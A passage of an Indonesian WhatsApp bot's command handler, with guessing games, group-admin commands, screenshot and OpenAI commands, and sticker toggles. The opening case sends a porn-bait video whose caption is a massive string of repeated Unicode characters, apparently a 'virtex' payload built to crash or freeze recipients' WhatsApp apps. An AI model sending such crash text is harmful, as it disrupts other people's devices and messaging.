                bluz.sendMessage(m.chat, { video: dwhee, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `[⫹⫺ - 㑒 ❝𝐁𝐎𝐊𝐄𝐏 - 𝐓𝐄𝐑𝐁𝐀𝐑𝐔❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦` }, { quoted: doc })
                }
                break
            //[================================< CASE GAME >==========================]
            case 'ffstalk':{
                //if (!isPrem) return replyprem(mess.premium)
                if (!q) return m.reply(`Contoh ${prefix+command} 946716486`)
                eeh = await scp1.nickff(`${q}`)
                m.reply(`*/ Stalking Freefire \\*
                
                Id : ${eeh.id}
                Nickname : ${eeh.nickname}`)
                }
                break
            case 'family100': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
               if ( checklimitUser(sender) <= 0) return m.reply(limitabis) 
              if ('family100'+m.chat in _family100) {
                  m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                  throw false
              }
              let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
              let random = anu[Math.floor(Math.random() * anu.length)]
              let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
              _family100['family100'+m.chat] = {
                  id: 'family100'+m.chat,
                  pesan: await bluz.sendText(m.chat, hasil, m),
                  ...random,
                  terjawab: Array.from(random.jawaban, () => false),
                  hadiah: 6,
              }
              }
              confirmlimit(sender, 1)
              break
              case 'p':
                var unicorn1 = fs.readFileSync('./bluzmedia/image/rumah.jpg')
sendKaylaMessage(from, { 
text: `Hai Kak @${sender.split("@")[0]}\n\n${mybag(prefix, pushname)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": global.botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": unicorn1,
"mediaUrl": 'https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly',
"sourceUrl": 'https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly'
}
}
})
break
                case 'tebak': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                   if ( checklimitUser(sender) <= 0) return m.reply(mess.endLimit) 
                  if (!text) return m.reply( `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`)
                  if (args[0] === "lagu") {
                      if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return m.reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
                      let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      let msg = await bluz.sendMessage(m.chat, {audio: { url: result.link_song }, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
                      bluz.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                      tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                      console.log("Jawaban: " + result.jawaban)
                      bluz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${global.botname} bot`, m)
                      delete tebaklagu[m.sender.split('@')[0]]
                      }
                  } else if (args[0] === 'gambar') {
                      if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return m.reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      bluz.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                      tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      console.log("Jawaban: " + result.jawaban)
                      })
                      await sleep(60000)
                      if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                      bluz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${global.botName} bot`, m)
                      delete tebakgambar[m.sender.split('@')[0]]
                      }
                  } else if (args[0] === 'kata') {
                      if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return m.reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      bluz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                      tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                      console.log("Jawaban: " + result.jawaban)
                      bluz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${global.botname} bot`, m)
                      delete tebakkata[m.sender.split('@')[0]]
                      }
                  } else if (args[0] === 'kalimat') {
                      if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return m.reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      bluz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                      tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                      console.log("Jawaban: " + result.jawaban)
                      bluz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${global.botname} bot`, m)
                      delete tebakkalimat[m.sender.split('@')[0]]
                      }
                  } else if (args[0] === 'lirik') {
                      if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return m.reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      bluz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                      tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                      console.log("Jawaban: " + result.jawaban)
                      bluz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${global.botname} bot`, m)
                      delete tebaklirik[m.sender.split('@')[0]]
                      }
                  } else if (args[0] === 'lontong') {
                      if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return m.reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      bluz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                      caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                  caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                      })
                      await sleep(60000)
                      if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                      console.log("Jawaban: " + result.jawaban)
                      bluz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${global.botname} bot`, m)
                      delete caklontong[m.sender.split('@')[0]]
                  delete caklontong_desk[m.sender.split('@')[0]]
                      }
                  }
                  }
                  confirmlimit(sender, 1)
                  break
            //[================================< CASE GRUP >==========================]
            case 'add': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
                await bluz.groupParticipantsUpdate(m.chat, users, 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'kick': { 
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
                await bluz.groupParticipantsUpdate(m.chat, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break    
            case 'afk': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break
            case 'antilink': 
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!isAdmins && !isCreator) return m.reply(mess.admin)
                //if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (args[0] === 'on') {
                if (isAntilink) return m.reply(`*Udah nyala!*`)
                antilink.push(from)
                fs.writeFileSync('./database/grup/antilink.json', JSON.stringify(antilink))
                m.reply('*「ANTILINK DI AKTIFKAN」*\n\nYang Mengenai Link Group Bakal Ke Kick!')
                } else if ((args[0]) === 'off') {
                    let anu = antilink.indexOf(from)
                antilink.splice(anu, 1)
                fs.writeFileSync('./database/grup/antilink.json', JSON.stringify(antilink))
                m.reply('*「ANTILINK DI NONAKTIFKAN」*')
                }
                break
             case 'antivirtex':
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!isAdmins && !isCreator) return m.reply(mess.admin)
                if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
                if ((args[0]) === 'on') {
                if (isAntiVirtex) return m.reply(`Already activated`) // BUAT REACTION AGAR JSON TERDETEKSI
                antivirtex.push(from)
                fs.writeFileSync('./database/grup/antivirtex.json', JSON.stringify(antivirtex))
                m.reply("SUKSES : ANTIVIRTEX ON")
                } else if ((args[0]) === 'off') {
                let anu = antivirtex.indexOf(from)
                antivirtex.splice(anu, 1)
                fs.writeFileSync('./database/grup/antivirtex.json', JSON.stringify(antivirtex))
                m.reply("SUKSES : ANTIVIRTEX OFF")
                }
                break 
            case 'demote': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
                await bluz.groupParticipantsUpdate(m.chat, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'promote': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
                await bluz.groupParticipantsUpdate(m.chat, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'editinfo': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await bluz.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await bluz.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await bluz.sendButtonText(m.chat, buttons, `Mode Edit Info`, bluz.user.name, m)

            }
            }
            break
            case 'group': case 'grup': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await bluz.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await bluz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await bluz.sendButtonText(m.chat, buttons, `Mode Group`, bluz.user.name, m)

             }
            }
            break
            case 'hidetag': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                bluz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
                }
                break
                case 'tagall': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!m.isGroup) throw mess.group
                    if (!isBotAdmins) throw mess.botAdmin
                    if (!isAdmins) throw mess.admin
    let teks = `══✪〘 *👥 Tag All* 〙✪══
     
     ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                    for (let mem of participants) {
                    teks += `⭔ @${mem.id.split('@')[0]}\n`
                    }
                    bluz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                    }
                    break
                   case 'totag': {
                   if (!m.isGroup) throw mess.group
                   if (!isBotAdmins) throw mess.botAdmin
                   if (!isAdmins) throw mess.admin
                   if (!m.quoted) throw `Reply pesan dengan caption ${prefix + command}`
                   bluz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
                   }
                   break
	    case 'setname': case 'setsubject': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await bluz.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await bluz.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await bluz.downloadAndSaveMediaMessage(qmsg)
                await bluz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'ss': case 'ssweb':{
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
                if (!q) return reply(`Contoh ${prefix+command} link`)
                m.reply(mess.wait)
                let krt = await scp1.ssweb(q)
                bluz.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
                }
                break
            case 'sshp': case 'ssphone':{
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
                if (!q) return reply(`Contoh ${prefix+command} link`)
                m.reply(mess.wait)
                let krt = await scp1.sshp(q)
                bluz.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
                }
                break
            case 'sstab': case 'sstablet':{
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
                if (!q) return reply(`Contoh ${prefix+command} link`)
                m.reply(mess.wait)
                let krt = await scp1.sstab(q)
                bluz.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
                }
                break
                case "ai": case "openai": 
                m.reply(mess.wait)
                try {
                  if (global.bluzai === "ISI_APIKEY_OPENAI_DISINI") return reply("Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file key.json\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys");
                  if (!text) return reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`);
                  const configuration = new Configuration({
                    apiKey: global.bluzai,
                  });
                  const openai = new OpenAIApi(configuration);
      
                  const response = await openai.createCompletion({
                    model: "text-davinci-003",
                    prompt: text,
                    temperature: 0.3,
                    max_tokens: 2000,
                    top_p: 1.0,
                    frequency_penalty: 0.0,
                    presence_penalty: 0.0,
                  });
                  m.reply(`${response.data.choices[0].text}`);
                } catch (err) {
                  console.log(err);
                  m.reply("Maaf, sepertinya ada yang error :" + err);
                }
                break;
              case "img": case "ai-img": case "image": case "images":
                m.reply(mess.wait)
                try {
                  if (global.bluzai === "ISI_APIKEY_OPENAI_DISINI") return reply("Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file key.json\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys");
                  if (!text) return reply(`Membuat gambar dari AI.\n\nContoh:\n${prefix}${command} Wooden house on snow mountain`);
                  const configuration = new Configuration({
                    apiKey: global.bluzai,
                  });
                  const openai = new OpenAIApi(configuration);
                  const response = await openai.createImage({
                    prompt: text,
                    n: 1,
                    size: "512x512",
                  });
                  //console.log(response.data.data[0].url)
                  bluz.sendImage(from, response.data.data[0].url, text, mek);
                } catch (err) {
                  console.log(err);
                  m.reply("Maaf, sepertinya ada yang error :"+ err);
                }
                break;
        //[================================< CASE STICKER >==========================]
        case 'attp': case 'ttp': {
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw `Example : ${prefix + command} text`
                await bluz.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'bluz', 'morou', m, {asSticker: true})
            }
            break
        case 'autosticker':
        case 'autostiker':
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                //if (isBan) return reply(mess.ban)	 			
                //if (isBanChat) return reply(mess.banChat)
                //if (!m.isGroup) return replay(mess.group)
                //if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins && !isCreator) return m.reply(mess.admin)
                if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
                if (args[0]  === 'on'){
                if (isAutoSticker) return m.reply(`Already activated`)
                autosticker.push(from)
                fs.writeFileSync('./database/grup/autosticker.json', JSON.stringify(autosticker))
                m.reply('autosticker activated')
                } else if (args[0] === 'off'){
                let anu = autosticker.indexOf(from)
                autosticker.splice(anu, 1)
                fs.writeFileSync('./database/grup/autosticker.json', JSON.stringify(autosticker))
                m.reply('auto sticker deactivated')
            }
            break
        case 'autostickerpc':
        case 'autostikerpc':
